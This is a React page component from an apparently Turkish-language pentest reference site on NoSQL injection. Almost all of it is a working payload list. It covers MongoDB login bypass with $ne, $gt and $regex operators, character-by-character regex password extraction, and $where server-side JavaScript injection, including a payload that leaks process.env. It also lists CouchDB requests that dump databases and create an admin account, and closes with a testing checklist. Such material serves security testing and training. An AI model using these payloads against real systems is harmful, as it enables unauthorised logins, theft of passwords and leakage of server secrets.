"use client"

import { motion } from "framer-motion"
import { Database, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "mongo-auth", title: "MongoDB Authentication Bypass", level: 2 },
  { id: "data-extraction", title: "Data Extraction", level: 2 },
  { id: "operators", title: "MongoDB Operators", level: 2 },
  { id: "ssjs", title: "Server-Side JavaScript", level: 2 },
  { id: "couchdb", title: "CouchDB Injection", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function NoSQLInjectionPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-yellow-400 text-sm font-medium mb-4">
            <Database className="w-4 h-4" />
            <span>Injection Zafiyetleri</span>
          </div>
          <h1 className="text-4xl font-bold text-foreground mb-4">NoSQL Injection</h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            MongoDB, CouchDB ve diğer NoSQL veritabanlarına yönelik injection saldırıları.
            Authentication bypass, data extraction ve server-side JavaScript injection.
          </p>
        </motion.div>

        <Callout type="warning" title="Yaygın Hedef">
          MongoDB en yaygın NoSQL veritabanı ve en çok hedef alınan. Node.js + Express + MongoDB
          stack&apos;inde özellikle yaygındır.
        </Callout>

        <motion.section variants={fadeIn} id="mongo-auth" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            MongoDB Authentication Bypass
          </h2>
          <PayloadList
            title="Login Bypass Payloads"
            initialShow={10}
            payloads={[
              { code: `{"username":{"$ne":""},"password":{"$ne":""}}`, note: "Not equal - tüm kullanıcılar" },
              { code: `{"username":"admin","password":{"$ne":""}}`, note: "Admin girişi" },
              { code: `{"username":"admin","password":{"$gt":""}}`, note: "Greater than boş string" },
              { code: `{"username":{"$gt":""},"password":{"$gt":""}}`, note: "İlk kullanıcı ile giriş" },
              { code: `{"username":{"$regex":"admin"},"password":{"$ne":""}}`, note: "Regex ile username match" },
              { code: `{"username":{"$regex":"^admin"},"password":{"$regex":".*"}}`, note: "Regex wildcard" },
              { code: `{"username":{"$in":["admin","root"]},"password":{"$ne":""}}`, note: "$in operator" },
              { code: `{"username":{"$exists":true},"password":{"$exists":true}}`, note: "$exists operator" },
              { code: `username=admin&password[$ne]=x`, note: "URL parameter injection" },
              { code: `username=admin&password[$gt]=`, note: "URL parameter $gt" },
              { code: `username[$ne]=x&password[$ne]=x`, note: "Both fields injection" },
              { code: `username=admin&password[$regex]=.*`, note: "URL regex injection" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="data-extraction" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Data Extraction
          </h2>
          <PayloadList
            title="Blind Data Extraction"
            initialShow={8}
            payloads={[
              { code: `{"username":"admin","password":{"$regex":"^a"}}`, note: "Password 'a' ile mi başlıyor?" },
              { code: `{"username":"admin","password":{"$regex":"^ab"}}`, note: "İlk 2 karakter 'ab' mi?" },
              { code: `{"username":"admin","password":{"$regex":"^abc"}}`, note: "Karakter karakter extraction" },
              { code: `{"username":{"$regex":"^a"},"password":{"$ne":""}}`, note: "Username enumeration" },
              { code: `{"email":{"$regex":".*@target.com"},"password":{"$ne":""}}`, note: "Email enumeration" },
              { code: `{"$where":"this.password.length == 8"}`, note: "Password uzunluğu tespiti" },
              { code: `{"$where":"this.password[0] == 'a'"}`, note: "$where ile karakter extraction" },
              { code: `{"$where":"this.username == 'admin' && this.password.match(/^a/)"}`   , note: "$where regex" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="operators" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            MongoDB Operators
          </h2>
          <PayloadList
            title="Operator Injection"
            initialShow={10}
            payloads={[
              { code: `{"$ne": "value"}`, note: "Not equal" },
              { code: `{"$gt": ""}`, note: "Greater than" },
              { code: `{"$lt": "~"}`, note: "Less than" },
              { code: `{"$gte": ""}`, note: "Greater than or equal" },
              { code: `{"$in": ["admin","root","user"]}`, note: "In array" },
              { code: `{"$nin": ["blocked"]}`, note: "Not in array" },
              { code: `{"$regex": ".*"}`, note: "Regex match all" },
              { code: `{"$exists": true}`, note: "Field exists" },
              { code: `{"$or": [{"a":"b"},{"c":"d"}]}`, note: "OR operator" },
              { code: `{"$where": "1==1"}`, note: "JavaScript evaluation" },
              { code: `{"$where": "sleep(5000)"}`, note: "Time-based blind" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="ssjs" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Server-Side JavaScript
          </h2>
          <PayloadList
            title="SSJS Injection"
            initialShow={6}
            payloads={[
              { code: `{"$where":"sleep(5000)"}`, note: "Time-based detection" },
              { code: `{"$where":"this.a=='\\'; return true; var x='"}`, note: "Always true" },
              { code: `'; return true; var x='`, note: "String breakout" },
              { code: `0; return true`, note: "Numeric breakout" },
              { code: `{"$where":"(function(){var x=new this.constructor.constructor('return process.env')();return JSON.stringify(x)})()"}`, note: "Environment variable leak" },
              { code: `db.users.find({$where: "this.password.match(/^admin/)"})`, note: "Direct MongoDB shell" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="couchdb" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-orange-500/10 text-orange-400 text-sm font-mono">05</span>
            CouchDB Injection
          </h2>
          <PayloadList
            title="CouchDB Payloads"
            initialShow={4}
            payloads={[
              { code: `GET /_all_dbs`, note: "Tüm veritabanlarını listele" },
              { code: `GET /db_name/_all_docs`, note: "Tüm dokümanları listele" },
              { code: `GET /_config`, note: "Konfigürasyon bilgisi" },
              { code: `PUT /_users/org.couchdb.user:hacker {"name":"hacker","password":"pass","roles":["_admin"],"type":"user"}`, note: "Admin kullanıcı oluşturma" },
            ]}
          />
        </motion.section>

        <Callout type="tip" title="Test Metodolojisi">
          1. JSON body&apos;de operator injection deneyin ($ne, $gt, $regex){"\n"}
          2. URL parametrelerinde bracket notation kullanın (param[$ne]=){"\n"}
          3. Regex ile blind data extraction yapın (karakter karakter){"\n"}
          4. $where ile SSJS injection deneyin{"\n"}
          5. Content-Type: application/json olduğundan emin olun
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/injection/ldap"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              LDAP Injection
            </Link>
            <Link
              href="/docs/injection/ssti"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              SSTI
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
